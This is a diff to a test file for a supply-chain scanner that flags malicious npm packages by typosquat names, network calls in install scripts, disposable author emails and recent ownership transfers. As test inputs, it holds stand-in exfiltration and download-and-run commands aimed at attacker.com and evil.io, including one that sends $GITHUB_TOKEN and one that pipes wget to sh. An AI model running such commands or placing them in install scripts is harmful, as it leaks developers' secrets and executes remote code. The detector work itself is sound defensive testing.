@@ -3,16 +3,22 @@
 
 import { describe, expect, test } from 'vitest'
 import {
+  DISPOSABLE_EMAIL_DOMAINS,
   KNOWN_MALICIOUS_NPM_PACKAGES,
+  NETWORK_CALL_PATTERNS,
+  OWNERSHIP_TRANSFER_THRESHOLD_DAYS,
   POPULAR_NPM_PACKAGES,
   SQUATTING_SCOPES,
   TYPOSQUAT_EDIT_DISTANCE,
   checkMaliciousPackage,
   computeMaliciousReport,
   containsHomoglyphSubstitution,
+  containsNetworkCall,
   findClosestPopularPackage,
-  isScopeSquat,
   isNumericSuffixVariant,
+  isRecentOwnershipTransfer,
+  isScopeSquat,
+  isSuspiciousAuthorEmail,
   levenshteinDistance,
 } from './maliciousPackageDetection'
 
@@ -188,7 +194,195 @@ describe('isScopeSquat', () => {
 })
 
 // ---------------------------------------------------------------------------
-// checkMaliciousPackage
+// containsNetworkCall
+// ---------------------------------------------------------------------------
+
+describe('containsNetworkCall', () => {
+  test('detects curl', () => {
+    expect(containsNetworkCall('curl https://attacker.com/exfil -d "$ENV"')).toBe(true)
+  })
+
+  test('detects wget', () => {
+    expect(containsNetworkCall('wget http://evil.io/payload.sh | sh')).toBe(true)
+  })
+
+  test('detects fetch(', () => {
+    expect(containsNetworkCall("fetch('https://evil.io', { method: 'POST', body: data })")).toBe(true)
+  })
+
+  test('detects https.request(', () => {
+    expect(containsNetworkCall('https.request({ host: "evil.io" }, cb)')).toBe(true)
+  })
+
+  test('detects http.get(', () => {
+    expect(containsNetworkCall("http.get('http://evil.io/payload', (res) => {})")). toBe(true)
+  })
+
+  test('detects http.post(', () => {
+    expect(containsNetworkCall('http.post(url, data)')).toBe(true)
+  })
+
+  test("detects require('http')", () => {
+    expect(containsNetworkCall("const http = require('http')\nhttp.get(url)")).toBe(true)
+  })
+
+  test("detects require(\"https\")", () => {
+    expect(containsNetworkCall('const h = require("https")')).toBe(true)
+  })
+
+  test('detects import from http', () => {
+    expect(containsNetworkCall("import http from 'http'")).toBe(true)
+  })
+
+  test('detects dns.lookup(', () => {
+    expect(containsNetworkCall("dns.lookup('evil.io', (err, addr) => {})")).toBe(true)
+  })
+
+  test('detects net.connect(', () => {
+    expect(containsNetworkCall("net.connect(4444, 'evil.io')")).toBe(true)
+  })
+
+  test('detects new XMLHttpRequest()', () => {
+    expect(containsNetworkCall('const xhr = new XMLHttpRequest()')).toBe(true)
+  })
+
+  test('detects new WebSocket(', () => {
+    expect(containsNetworkCall("const ws = new WebSocket('wss://evil.io')")).toBe(true)
+  })
+
+  test('returns false for a normal build script', () => {
+    expect(containsNetworkCall('tsc && node scripts/build.js')).toBe(false)
+  })
+
+  test('returns false for an empty string', () => {
+    expect(containsNetworkCall('')).toBe(false)
+  })
+
+  test('returns false for a benign npm lifecycle script', () => {
+    expect(containsNetworkCall('node -e "require(\'./scripts/postinstall\')"')).toBe(false)
+  })
+
+  test('NETWORK_CALL_PATTERNS array is non-empty', () => {
+    expect(NETWORK_CALL_PATTERNS.length).toBeGreaterThan(0)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// isSuspiciousAuthorEmail
+// ---------------------------------------------------------------------------
+
+describe('isSuspiciousAuthorEmail', () => {
+  test('returns true for mailinator.com', () => {
+    expect(isSuspiciousAuthorEmail('attacker@mailinator.com')).toBe(true)
+  })
+
+  test('returns true for guerrillamail.com', () => {
+    expect(isSuspiciousAuthorEmail('anon@guerrillamail.com')).toBe(true)
+  })
+
+  test('returns true for tempmail.com', () => {
+    expect(isSuspiciousAuthorEmail('throwaway@tempmail.com')).toBe(true)
+  })
+
+  test('returns true for yopmail.com', () => {
+    expect(isSuspiciousAuthorEmail('bad@yopmail.com')).toBe(true)
+  })
+
+  test('returns true for trashmail.io', () => {
+    expect(isSuspiciousAuthorEmail('x@trashmail.io')).toBe(true)
+  })
+
+  test('returns false for @gmail.com (legitimate domain)', () => {
+    expect(isSuspiciousAuthorEmail('dev@gmail.com')).toBe(false)
+  })
+
+  test('returns false for @yahoo.com', () => {
+    expect(isSuspiciousAuthorEmail('maintainer@yahoo.com')).toBe(false)
+  })
+
+  test('returns false for a corporate email', () => {
+    expect(isSuspiciousAuthorEmail('alice@company.io')).toBe(false)
+  })
+
+  test('returns false when there is no @ sign', () => {
+    expect(isSuspiciousAuthorEmail('notanemail')).toBe(false)
+  })
+
+  test('returns false for an empty string', () => {
+    expect(isSuspiciousAuthorEmail('')).toBe(false)
+  })
+
+  test('uses the rightmost @ for display-name addresses', () => {
+    // "Alice <bad@mailinator.com>" style — lastIndexOf('@') finds the domain
+    expect(isSuspiciousAuthorEmail('Alice <bad@mailinator.com>')).toBe(true)
+  })
+
+  test('domain comparison is case-insensitive', () => {
+    expect(isSuspiciousAuthorEmail('user@MAILINATOR.COM')).toBe(true)
+    expect(isSuspiciousAuthorEmail('user@Guerrillamail.Com')).toBe(true)
+  })
+
+  test('DISPOSABLE_EMAIL_DOMAINS contains at least 20 entries', () => {
+    expect(DISPOSABLE_EMAIL_DOMAINS.size).toBeGreaterThanOrEqual(20)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// isRecentOwnershipTransfer
+// ---------------------------------------------------------------------------
+
+describe('isRecentOwnershipTransfer', () => {
+  const NOW = Date.now()
+  const DAY = 24 * 60 * 60 * 1000
+
+  test('returns true for a transfer 1 day ago', () => {
+    const date = new Date(NOW - DAY).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(true)
+  })
+
+  test('returns true for a transfer 30 days ago', () => {
+    const date = new Date(NOW - 30 * DAY).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(true)
+  })
+
+  test('returns true for a transfer exactly at the threshold boundary', () => {
+    const date = new Date(NOW - OWNERSHIP_TRANSFER_THRESHOLD_DAYS * DAY).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(true)
+  })
+
+  test('returns false for a transfer 1 ms past the threshold', () => {
+    const date = new Date(NOW - OWNERSHIP_TRANSFER_THRESHOLD_DAYS * DAY - 1).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
+  })
+
+  test('returns false for a transfer 91 days ago', () => {
+    const date = new Date(NOW - 91 * DAY).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
+  })
+
+  test('returns false for a transfer 180 days ago', () => {
+    const date = new Date(NOW - 180 * DAY).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
+  })
+
+  test('returns false for a future date', () => {
+    const date = new Date(NOW + DAY).toISOString()
+    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
+  })
+
+  test('returns false for an invalid / non-parseable date string', () => {
+    expect(isRecentOwnershipTransfer('not-a-date', NOW)).toBe(false)
+    expect(isRecentOwnershipTransfer('', NOW)).toBe(false)
+    expect(isRecentOwnershipTransfer('2099-99-99', NOW)).toBe(false)
+  })
+
+  test('OWNERSHIP_TRANSFER_THRESHOLD_DAYS is 90', () => {
+    expect(OWNERSHIP_TRANSFER_THRESHOLD_DAYS).toBe(90)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// checkMaliciousPackage — existing signals
 // ---------------------------------------------------------------------------
 
 describe('checkMaliciousPackage', () => {
@@ -228,9 +422,7 @@ describe('checkMaliciousPackage', () => {
   })
 
   test('known_malicious does NOT fire for non-npm ecosystems', () => {
-    // crossenv in pypi would not fire the npm-only known_malicious signal
     const finding = checkMaliciousPackage({ name: 'crossenv', version: '1.0.0', ecosystem: 'pypi' })
-    // May still fire suspicious_name_pattern if applicable, but not known_malicious
     if (finding) {
       expect(finding.signals).not.toContain('known_malicious')
     }
@@ -247,7 +439,6 @@ describe('checkMaliciousPackage', () => {
   })
 
   test('does NOT fire typosquat_near_popular for scoped packages (scope squat path instead)', () => {
-    // @evil/expres — scoped, so typosquat_near_popular is suppressed
     const finding = checkMaliciousPackage({ name: '@evil/expres', version: '1.0.0', ecosystem: 'npm' })
     if (finding) {
       expect(finding.signals).not.toContain('typosquat_near_popular')
@@ -255,7 +446,6 @@ describe('checkMaliciousPackage', () => {
   })
 
   test('does NOT fire typosquat_near_popular for non-npm ecosystems', () => {
-    // 'expres' in pypi won't fire the npm-only signal
     const finding = checkMaliciousPackage({ name: 'expres', version: '1.0.0', ecosystem: 'pypi' })
     if (finding) {
       expect(finding.signals).not.toContain('typosquat_near_popular')
@@ -265,8 +455,6 @@ describe('checkMaliciousPackage', () => {
   // ── Signal: suspicious_name_pattern ───────────────────────────────────────
 
   test('fires suspicious_name_pattern for numeric suffix variant', () => {
-    // lodash21: length 8 vs lodash length 6 — length diff 2 blocks Signal 2,
-    // so only Signal 3 (isNumericSuffixVariant) fires.
     const finding = checkMaliciousPackage({ name: 'lodash21', version: '1.0.0', ecosystem: 'npm' })
     expect(finding).not.toBeNull()
     expect(finding!.signals).toContain('suspicious_name_pattern')
@@ -302,6 +490,309 @@ describe('checkMaliciousPackage', () => {
     expect(finding!.evidence).toContain('package=crossenv')
     expect(finding!.evidence).toContain('version=1.0.0')
     expect(finding!.evidence).toContain('signals=[known_malicious]')
+  })
+})
+
+// ---------------------------------------------------------------------------
+// checkMaliciousPackage — Signal 4: install_script_network_call
+// ---------------------------------------------------------------------------
+
+describe('checkMaliciousPackage — install_script_network_call', () => {
+  test('fires when installScript contains curl', () => {
+    const finding = checkMaliciousPackage({
+      name: 'innocuous-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'curl https://attacker.com/exfil -d "$HOME"',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('install_script_network_call')
+    expect(finding!.riskLevel).toBe('high')
+  })
+
+  test('fires when postinstallScript contains wget', () => {
+    const finding = checkMaliciousPackage({
+      name: 'another-pkg',
+      version: '2.0.0',
+      ecosystem: 'npm',
+      postinstallScript: 'wget http://evil.io/payload | sh',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('install_script_network_call')
+  })
+
+  test('fires when postinstallScript contains fetch(', () => {
+    const finding = checkMaliciousPackage({
+      name: 'fetch-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      postinstallScript: "fetch('https://evil.io', { body: process.env })",
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('install_script_network_call')
+  })
+
+  test('does NOT fire when installScript has no network call', () => {
+    const finding = checkMaliciousPackage({
+      name: 'clean-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'node scripts/postinstall.js',
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('does NOT fire when installScript is absent', () => {
+    const finding = checkMaliciousPackage({
+      name: 'clean-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('evidence string includes installScriptNetworkCall=true', () => {
+    const finding = checkMaliciousPackage({
+      name: 'spy-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'curl https://attacker.com',
+    })
+    expect(finding!.evidence).toContain('installScriptNetworkCall=true')
+  })
+
+  test('title identifies the lifecycle hook attack vector', () => {
+    const finding = checkMaliciousPackage({
+      name: 'spy-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'curl https://attacker.com',
+    })
+    expect(finding!.title).toMatch(/install script/i)
+  })
+
+  test('known_malicious + install_script_network_call → risk=critical (max)', () => {
+    const finding = checkMaliciousPackage({
+      name: 'crossenv',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      postinstallScript: 'curl https://attacker.com -d "$GITHUB_TOKEN"',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('known_malicious')
+    expect(finding!.signals).toContain('install_script_network_call')
+    expect(finding!.riskLevel).toBe('critical')
+  })
+
+  test('typosquat_near_popular + install_script_network_call → risk=high (max)', () => {
+    const finding = checkMaliciousPackage({
+      name: 'expres',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'wget http://evil.io',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('typosquat_near_popular')
+    expect(finding!.signals).toContain('install_script_network_call')
+    expect(finding!.riskLevel).toBe('high')
+  })
+})
+
+// ---------------------------------------------------------------------------
+// checkMaliciousPackage — Signal 5: suspicious_author_email
+// ---------------------------------------------------------------------------
+
+describe('checkMaliciousPackage — suspicious_author_email', () => {
+  test('fires when authorEmail uses a disposable domain', () => {
+    const finding = checkMaliciousPackage({
+      name: 'some-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      authorEmail: 'anon@mailinator.com',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('suspicious_author_email')
+    expect(finding!.riskLevel).toBe('low')
+  })
+
+  test('does NOT fire for a legitimate author email', () => {
+    const finding = checkMaliciousPackage({
+      name: 'some-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      authorEmail: 'developer@gmail.com',
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('does NOT fire when authorEmail is absent', () => {
+    const finding = checkMaliciousPackage({
+      name: 'some-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('evidence string includes the author email', () => {
+    const finding = checkMaliciousPackage({
+      name: 'spy-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      authorEmail: 'bad@yopmail.com',
+    })
+    expect(finding!.evidence).toContain('authorEmail=bad@yopmail.com')
+  })
+
+  test('suspicious_author_email risk (low) is dominated by typosquat risk (high)', () => {
+    const finding = checkMaliciousPackage({
+      name: 'expres',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      authorEmail: 'anon@mailinator.com',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('typosquat_near_popular')
+    expect(finding!.signals).toContain('suspicious_author_email')
+    expect(finding!.riskLevel).toBe('high')
+  })
+
+  test('suspicious_author_email alone produces a finding even without name signals', () => {
+    const finding = checkMaliciousPackage({
+      name: 'legitimately-named-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      authorEmail: 'anon@guerrillamail.com',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toEqual(['suspicious_author_email'])
+    expect(finding!.riskLevel).toBe('low')
+  })
+})
+
+// ---------------------------------------------------------------------------
+// checkMaliciousPackage — Signal 6: recent_ownership_transfer
+// ---------------------------------------------------------------------------
+
+describe('checkMaliciousPackage — recent_ownership_transfer', () => {
+  const RECENT = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString() // 30 days ago
+  const OLD = new Date(Date.now() - 200 * 24 * 60 * 60 * 1000).toISOString()   // 200 days ago
+
+  test('fires when lastOwnershipTransferredAt is within 90 days', () => {
+    const finding = checkMaliciousPackage({
+      name: 'popular-but-transferred',
+      version: '3.0.0',
+      ecosystem: 'npm',
+      lastOwnershipTransferredAt: RECENT,
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('recent_ownership_transfer')
+    expect(finding!.riskLevel).toBe('medium')
+  })
+
+  test('does NOT fire when transfer was more than 90 days ago', () => {
+    const finding = checkMaliciousPackage({
+      name: 'popular-but-transferred',
+      version: '3.0.0',
+      ecosystem: 'npm',
+      lastOwnershipTransferredAt: OLD,
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('does NOT fire when lastOwnershipTransferredAt is absent', () => {
+    const finding = checkMaliciousPackage({
+      name: 'popular-but-transferred',
+      version: '3.0.0',
+      ecosystem: 'npm',
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('evidence string includes the transfer date', () => {
+    const finding = checkMaliciousPackage({
+      name: 'spy-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      lastOwnershipTransferredAt: RECENT,
+    })
+    expect(finding!.evidence).toContain('ownershipTransferredAt=')
+  })
+
+  test('typosquat + recent_ownership_transfer → risk=high (max of high/medium)', () => {
+    const finding = checkMaliciousPackage({
+      name: 'expres',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      lastOwnershipTransferredAt: RECENT,
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('typosquat_near_popular')
+    expect(finding!.signals).toContain('recent_ownership_transfer')
+    expect(finding!.riskLevel).toBe('high')
+  })
+
+  test('title identifies ownership transfer when it is the primary signal', () => {
+    const finding = checkMaliciousPackage({
+      name: 'clean-name-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      lastOwnershipTransferredAt: RECENT,
+    })
+    expect(finding!.title).toMatch(/ownership/i)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// checkMaliciousPackage — multi-signal behavioral combinations
+// ---------------------------------------------------------------------------
+
+describe('checkMaliciousPackage — multi-signal behavioral', () => {
+  const RECENT = new Date(Date.now() - 15 * 24 * 60 * 60 * 1000).toISOString()
+
+  test('all three behavioral signals fire and produce risk=high', () => {
+    const finding = checkMaliciousPackage({
+      name: 'triple-threat-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'curl https://evil.io -d "$HOME"',
+      authorEmail: 'anon@mailinator.com',
+      lastOwnershipTransferredAt: RECENT,
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('install_script_network_call')
+    expect(finding!.signals).toContain('suspicious_author_email')
+    expect(finding!.signals).toContain('recent_ownership_transfer')
+    // install_script_network_call = high; author_email = low; transfer = medium → max = high
+    expect(finding!.riskLevel).toBe('high')
+  })
+
+  test('clean package with clean metadata stays null', () => {
+    const finding = checkMaliciousPackage({
+      name: 'my-clean-tool',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'node build.js',
+      authorEmail: 'dev@company.io',
+      lastOwnershipTransferredAt: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000).toISOString(),
+    })
+    expect(finding).toBeNull()
+  })
+
+  test('install_script + suspicious_email but clean name → both behavioral signals', () => {
+    const finding = checkMaliciousPackage({
+      name: 'cleanname',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      installScript: 'wget http://evil.io | bash',
+      authorEmail: 'x@trashmail.me',
+    })
+    expect(finding).not.toBeNull()
+    expect(finding!.signals).toContain('install_script_network_call')
+    expect(finding!.signals).toContain('suspicious_author_email')
+    expect(finding!.signals).not.toContain('known_malicious')
+    expect(finding!.signals).not.toContain('typosquat_near_popular')
+    expect(finding!.riskLevel).toBe('high')
   })
 })
 
@@ -401,6 +892,34 @@ describe('computeMaliciousReport', () => {
     const report = computeMaliciousReport(components)
     expect(report.criticalCount).toBe(3)
     expect(report.findings).toHaveLength(3)
+  })
+
+  test('passes metadata fields through to checkMaliciousPackage', () => {
+    const components = [
+      {
+        name: 'cleanname-pkg',
+        version: '1.0.0',
+        ecosystem: 'npm',
+        installScript: 'curl https://evil.io',
+      },
+    ]
+    const report = computeMaliciousReport(components)
+    expect(report.totalSuspicious).toBe(1)
+    expect(report.findings[0].signals).toContain('install_script_network_call')
+  })
+
+  test('overallRisk=low when only suspicious_author_email fires', () => {
+    const components = [
+      {
+        name: 'fine-name-pkg',
+        version: '1.0.0',
+        ecosystem: 'npm',
+        authorEmail: 'anon@mailinator.com',
+      },
+    ]
+    const report = computeMaliciousReport(components)
+    expect(report.overallRisk).toBe('low')
+    expect(report.lowCount).toBe(1)
   })
 })
 
